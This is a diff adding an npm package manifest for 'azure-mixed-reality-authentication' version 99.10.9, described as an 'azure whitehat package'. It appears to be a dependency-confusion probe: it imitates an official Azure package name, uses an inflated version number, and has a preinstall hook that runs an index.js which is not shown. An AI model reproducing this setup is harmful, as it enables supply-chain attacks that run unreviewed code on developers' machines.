@@ -1,0 +1,39 @@
+{
+    "name": "azure-mixed-reality-authentication",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-mixed-reality-authentication@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-mub1+bOX1OhQo5rDjo4MzqvJXhDpHesjKa3ki3eGQgIcrn6LkcOPGEZ49+EzeCyBnzA0rTq+4h38d1m0uwUMnw==",
+        "shasum": "75f5c235dad5131e761b31990a1a72ba8dda1d39",
+        "tarball": "https://registry.npmjs.org/azure-mixed-reality-authentication/-/azure-mixed-reality-authentication-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3598,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSpxCRA9TVsSAnZWagAAQ70QAJVnnqrZBnT87ysbXhwr\npIEYf4sXKqVS9ue0Gd3Bt8AS7OwrP8a79leEoQwzeMNa77UgMIlfUbef7ntp\nh9RSPSqBjI/5ytRKJSGvOTcIsSRJdyUp9GhqEDQjnBY6dYRt8GKd1CH3atkJ\nd7LzBer2vxM+0JPD1DHlg4I0MQcEXL2pstIn48ZoT+PilVZLLWUKPKzsXPxH\nHb7yrCwDSgF9FfyXcyDG//RUfddeVKtTJjF1g6cBxg2nworf2E4jTNAW8E0k\nHJhwkE2ONLONeHgFRSnRj6EsF7JwTDPMndG7Hl7C/z/XgCUUgZ/E0MO6mMp4\nWtbjX42Xn8OVQlXqVMk0JfWONVsK+37paSVb67TfyelM3ut6YovoIX27CoAP\nBJ3ApmyD6t2Ui9KXwSRDjDZlsBJFuxwpTkIlERqCVqa7Kky+whJzzGHOvhlt\nfhDruCgxWPFbR6cMdEjlqeexYN0lxKlp5QsM2onfi7QtxdoEkA7pJUMA7PAq\n4NqdhPf3NMKm9r26ndz3h+VezOX+qPitJQcYjFqIT0JFFyMblyRktJ/m1xpr\n7wWkzY2HUxehtoxEh4ZnwDbomONKobZSmGJ2i8+A/9TdFbX/muZVOibmdO1i\nERBn4Vdsi/N16fCmJvcJGhCRlO52PvRZi8LrkLycWNjBJocJwAlUjheE0cgP\nYdgN\r\n=/Gv0\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-mixed-reality-authentication_99.10.9_1637952113575_0.3274090879515845"
+    },
+    "_hasShrinkwrap": false
+}
